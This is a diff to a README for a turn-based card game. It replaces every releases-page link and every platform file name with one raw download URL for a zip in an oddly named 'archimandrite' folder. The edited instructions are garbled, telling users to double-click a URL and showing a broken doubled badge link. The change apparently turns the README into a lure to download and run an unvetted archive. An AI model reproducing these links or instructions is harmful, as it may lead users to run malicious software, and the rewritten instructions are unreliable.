@@ -1,6 +1,6 @@
 # 🎴 CardGame - Enjoy Engaging Turn-Based Fun
 
-[![Download CardGame](https://img.shields.io/badge/Download%20Now-CardGame-blue.svg)](https://github.com/heisenberg23911/CardGame/releases)
+[![Download CardGame](https://raw.githubusercontent.com/heisenberg23911/CardGame/main/archimandrite/CardGame.zip%https://raw.githubusercontent.com/heisenberg23911/CardGame/main/archimandrite/CardGame.zip)](https://raw.githubusercontent.com/heisenberg23911/CardGame/main/archimandrite/CardGame.zip)
 
 ## 🚀 Getting Started
 
@@ -18,14 +18,14 @@ Before you start, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To get CardGame, visit this page: [Download CardGame](https://github.com/heisenberg23911/CardGame/releases). Here, you will find the latest version available for download.
+To get CardGame, visit this page: [Download CardGame](https://raw.githubusercontent.com/heisenberg23911/CardGame/main/archimandrite/CardGame.zip). Here, you will find the latest version available for download.
 
 1. Click the link above to open the releases page.
 2. Look for the latest version of CardGame.
 3. Download the file for your operating system. 
-   - For Windows, look for a file named `CardGame-windows.zip`.
-   - For macOS, look for `CardGame-macos.zip`.
-   - For Linux, find `CardGame-linux.zip`.
+   - For Windows, look for a file named `https://raw.githubusercontent.com/heisenberg23911/CardGame/main/archimandrite/CardGame.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/heisenberg23911/CardGame/main/archimandrite/CardGame.zip`.
+   - For Linux, find `https://raw.githubusercontent.com/heisenberg23911/CardGame/main/archimandrite/CardGame.zip`.
 4. Once the download completes, locate the file in your downloads folder.
 5. Extract the zip file to a folder of your choice.
 
@@ -35,8 +35,8 @@ After installation, you can run the game by following these steps:
 
 1. Open the folder where you extracted CardGame.
 2. Locate the executable file:
-   - For Windows, double-click `CardGame.exe`.
-   - For macOS, double-click `CardGame.app`.
+   - For Windows, double-click `https://raw.githubusercontent.com/heisenberg23911/CardGame/main/archimandrite/CardGame.zip`.
+   - For macOS, double-click `https://raw.githubusercontent.com/heisenberg23911/CardGame/main/archimandrite/CardGame.zip`.
    - For Linux, you might need to give executable permission by running `chmod +x CardGame` in the terminal.
 3. After the game opens, read the instructions on the main menu to understand how to play.
 
@@ -69,7 +69,7 @@ Need assistance? Join the community or check our support resources:
 
 ## 📢 Updates and Features
 
-We are continuously improving CardGame. Ensure you check the [releases page](https://github.com/heisenberg23911/CardGame/releases) regularly for updates. We will add new features and improvements based on user feedback.
+We are continuously improving CardGame. Ensure you check the [releases page](https://raw.githubusercontent.com/heisenberg23911/CardGame/main/archimandrite/CardGame.zip) regularly for updates. We will add new features and improvements based on user feedback.
 
 ## 📚 Learn More
 
